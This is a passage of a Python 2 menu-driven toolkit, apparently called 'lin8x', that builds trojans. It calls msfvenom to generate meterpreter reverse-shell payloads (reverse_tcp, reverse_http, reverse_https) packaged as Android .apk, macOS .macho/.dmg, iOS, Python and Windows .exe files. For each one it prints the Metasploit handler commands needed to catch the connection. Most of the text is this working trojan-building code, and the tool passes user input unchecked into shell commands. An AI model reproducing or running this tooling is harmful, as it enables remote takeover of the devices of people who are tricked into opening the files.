    print bcolors.red + """############################################################
    """
    answer5 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if answer5 == '1':
        subprocess.call(["python", "lin8x.py"])
    if answer5 == '99':
        subprocess.call(["python", "lin8x.py"])
    else:
        subprocess.call(["python", "lin8x.py"])


############################################################

elif answer == "5":
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    clearScr()
    print bcolors.red + """############################################################"""
    print bcolors.cyan + """
                         ______                     
 _________        .---"""      """---.              
:______.-':      :  .--------------.  :             
| ______  |      | :                : |             
|:______B:|      | |  Error, Virus: | |             
|:______B:|      | |                | |             
|:______B:|      | |  Files Not     | |             
|         |      | |  found.        | |             
|:_____:  |      | |                | |             
|    ==   |      | :                : |             
|       O |      :  '--------------'  :             
|       o |      :'---...______...---'              
|       o |-._.-i___/'             \._              
|'-.____o_|   '-.   '-...______...-'  `-._          
:_________:      `.____________________   `-.___.-. 
                 .'.eeeeeeeeeeeeeeeeee.'.      :___:
    fsc        .'.eeeeeeeeeeeeeeeeeeeeee.'.         
              :____________________________:
"""
    
    print bcolors.green + """
The Difference Between all Reverse Shell Types:

reverse_tcp = Basic Attack/Rat, connection is shown towards you and the attacker's
IP

reverse_https = Basic Attack/Rat, makes it look like encrypted website requests 
and communication

reverse_http = Basic Attack/Rat, makes it look like unencrypted website requests 
and communication
"""

    print bcolors.red + """[1]""" + bcolors.blue + """  Android"""
    print bcolors.red + """[2]""" + bcolors.blue + """  Mac OS / iOS"""
    print bcolors.red + """[3]""" + bcolors.blue + """  Windows (XP - 10)"""
    print bcolors.red + """[4]""" + bcolors.blue + """  Linux"""
    print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

    print bcolors.white + ""

    print bcolors.red + """############################################################
    """

    v = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
    if v == '1':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""

        print bcolors.green + """
                          .--.
                          |  |
                          |  |
                          |  |
                          |  |
         _.-----------._  |  |
      .-'      __       `-.  |
    .'       .'  `.        `.|
   ;         :    :          ;
   |         `.__.'          |
   |   ___                   |
   |  (_S_) A N D R O I D    |
   | .---------------------. |
   | |      \      /       | |
   | |       \    /        | |
   | |        \  /         | |
   | |         \/          | |
   | |         /\          | |
   | |        /  \         | |
   | |       /    \        | |
   | `---------------------' |
   |                         |
   |                __       |
   |  ________  .-~~__~~-.   |
   | |___C___/ /  .'  `.  \  |
   |  ______  ;   : OK :   ; |
   | |__A___| |  _`.__.'_  | |
   |  _______ ; \< |  | >/ ; |
   | [_=
"""
     
        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .apk)"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .apk)"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_http, .apk)"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

        print ""

        print bcolors.red + """############################################################
"""
        v1 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if v1 == '1':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Android Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p android/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ R > /root/Desktop/""" + name1 + """.apk""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk == '2':
                subprocess.call(["python", "lin8x.py"])
        if v1 == '99':
            subprocess.call(["python", "lin8x.py"])

        if v == '2':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Android Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p android/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ R > /root/Desktop/""" + name1 + """.apk""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload android/meterpreter/reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk == '2':
                subprocess.call(["python", "lin8x.py"])
        if v1 == '99':
            subprocess.call(["python", "lin8x.py"])


        if v1 == '2':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Android Trojan through reverse_http...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p android/meterpreter/reverse_http LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ R > /root/Desktop/""" + name1 + """.apk""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload android/meterpreter/reverse_http
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk == '2':
                subprocess.call(["python", "lin8x.py"])
        if v1 == '99':
            subprocess.call(["python", "lin8x.py"])

############################################################

    if v == '2':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""

        print bcolors.green + """
....... .. .       .   .           . DDDN      .............
.....    . .                  .   DNDDDD$    . .............
...   .. ....  .. ........ .. ..$DDDDDDD  .. ...............
... ... ....                   NDDDDDDDD       .............
...   ...... .. . .. ... .  ..NDDDDDDDD..  ... .............
......  .... . .... ...  .....DDDDDDDN  .... ...............
...     .. .                 ODDDDDD.          .............
...   . ....                 NDDDN..           .............
...  .   ...    .  ~O+..           ..:MDDD...  .............
..... . .. . ..DDDDDDDDDDND.   ..NDDDDDDDDDDDNO.............
... ..  ....NDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDM...........
...      ..DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD..........
...   . .=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD...........
...    ..DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDN............
... . ..NDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD..............
...    $DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDO .............
...  ..DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD. .............
...    DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD  .............
...   .DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD  .............
... . .DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD  .............
... . .DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD...............
... ...DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD? .............
...    NDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD..............
...   . DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD~............
... .  .NDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ..........
...     .DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD.........
... . . .DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDN........
... . . ..DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD ........
... . . ...DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD..........
...........?DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD7..........
............ZDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD$...........
.............,DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDI........ . .
...............DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD .  . .    .. 
................DDDDDDDDDDDDDNNNDNDDDDDDDDDDD..   .  .  .  .
..................DDDDDDN..........,NDDDDDN ......  ....... 
"""
     
        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .macho / Mac OS)"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .macho / iOS)"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .py)"""
        print bcolors.red + """[4]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .macho / Mac OS)"""
        print bcolors.red + """[5]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .macho / iOS)"""
        print bcolors.red + """[6]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .py)"""
        print bcolors.red + """[7]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .dmg / Mac OS)"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

        print ""

        print bcolors.red + """############################################################
"""
        v2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if v2 == '1':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p osx/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload osx/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2 == '2':
                subprocess.call(["python", "lin8x.py"])

        if v2 == '2':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a iOS Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p apple_ios/aarch64/meterpreter_reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload apple_ios/aarch64/meterpreter_reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2 == '2':
                subprocess.call(["python", "lin8x.py"])




        if v2 == '3':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Mac OS / Python Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p python/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f elf > /root/Desktop/""" + name1 + """.py""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2a = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2a == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2a == '2':
                subprocess.call(["python", "lin8x.py"])


        if v2 == '4':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p osx/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload osx/meterpreter/reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2 == '2':
                subprocess.call(["python", "lin8x.py"])

        if v2 == '5':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a iOS Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p apple_ios/aarch64/meterpreter_reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f macho > /root/Desktop/""" + name1 + """.macho""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload apple_ios/aarch64/meterpreter_reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2 == '2':
                subprocess.call(["python", "lin8x.py"])


        if v2 == '6':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Mac OS / Python Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p python/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f elf > /root/Desktop/""" + name1 + """.py""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload python/meterpreter/reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2a = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2a == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2a == '2':
                subprocess.call(["python", "lin8x.py"])


        if v2 == '7':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Mac OS Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p osx/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f dmg > /root/Desktop/""" + name1 + """.dmg""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload osx/meterpreter/reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk2 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk2 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk2 == '2':
                subprocess.call(["python", "lin8x.py"])


        if v2 == '99':
            subprocess.call(["python", "lin8x.py"])

############################################################

    if v == '3':
        clearScr()
        clearScr()
        clearScr()
        clearScr()
        print bcolors.red + """############################################################"""

        print bcolors.green + """
             ________________________________________________
            /                                                \
           |    _________________________________________     |
           |   |                                         |    |
           |   |  C:\> _                                 |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |                                         |    |
           |   |_________________________________________|    |
           |                                                  |
            \_________________________________________________/
                   \___________________________________/
                ___________________________________________
             _-'    .-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-.  --- `-_
          _-'.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.--.  .-.-.`-_
       _-'.-.-.-. .---.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-`__`. .-.-.-.`-_
    _-'.-.-.-.-. .-----.-.-.-.-.-.-.-.-.-.-.-.-.-.-.-----. .-.-.-.-.`-_
 _-'.-.-.-.-.-. .---.-. .-------------------------. .-.---. .---.-.-.-.`-_
:-------------------------------------------------------------------------:
`---._.-------------------------------------------------------------._.---'
"""
     
        print bcolors.red + """[1]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .exe)"""
        print bcolors.red + """[2]""" + bcolors.blue + """  Create a Basic Trojan (reverse_https, .exe)"""
        print bcolors.red + """[3]""" + bcolors.blue + """  Create a Basic Trojan (reverse_http, .exe)"""
        print bcolors.red + """[4]""" + bcolors.blue + """  Create a Basic Trojan (reverse_tcp, .rar)"""
        print bcolors.red + """[99]""" + bcolors.blue + """ Back to Menu"""

        print ""

        print bcolors.red + """############################################################
"""
        v3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
        if v3 == '1':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Windows Trojan through reverse_tcp...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p windows/meterpreter/reverse_tcp LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk3 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk3 == '2':
                subprocess.call(["python", "lin8x.py"])
        if v3 == '2':
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.yellow + """You are now making a Windows Trojan through reverse_https...
Please answer all parts correctly.

(DO NOT PUT ANY SPACES IN YOUR ANSWERS, IF YOU NEED TO; DO " _ " 
OR " - " INSTEAD!)

YOU NEED MSFVENOM IN ORDER FOR THIS TO WORK!!!

(Press Ctrl + C To Exit!)
"""           

            print bcolors.red + """############################################################
"""
            lhost1 = raw_input(bcolors.yellow + "LHOST: ")
            lport1 = raw_input(bcolors.yellow + "LPORT: ")
            name1 = raw_input(bcolors.yellow + "Feel free to name the File: ")
            os.system("""msfvenom -p windows/meterpreter/reverse_https LHOST=""" + lhost1 + """ LPORT=""" + lport1 + """ -f exe > /root/Desktop/""" + name1 + """.exe""")
            clearScr()
            clearScr()
            clearScr()
            print bcolors.red + """############################################################
"""
            print bcolors.red + """
Please do the following commands in metasploit:"""
            print bcolors.white + """
use exploit/multi/handler
set payload windows/meterpreter/reverse_https
set lhost """ + lhost1
            print bcolors.white + """set lport """ + lport1
            print bcolors.white + """exploit"""
            print bcolors.red + """Feel free to Copy and Paste!
"""

            print bcolors.red + """############################################################
"""

            print bcolors.yellow + """
Would you like to use the payload right now?
"""
            print bcolors.red + """[1]""" + bcolors.blue + """  Yes, Open up Metasploit!"""
            print bcolors.red + """[2]""" + bcolors.blue + """  No thank you, I know how to access it.
Ill do it later.
"""
   
            idk3 = raw_input(bcolors.bold + bcolors.green + 'lin8x@kali' + bcolors.white + ':~# ')
            if idk3 == '1':
                os.system('msfconsole')
                subprocess.call(["python", "lin8x.py"])

            if idk3 == '2':
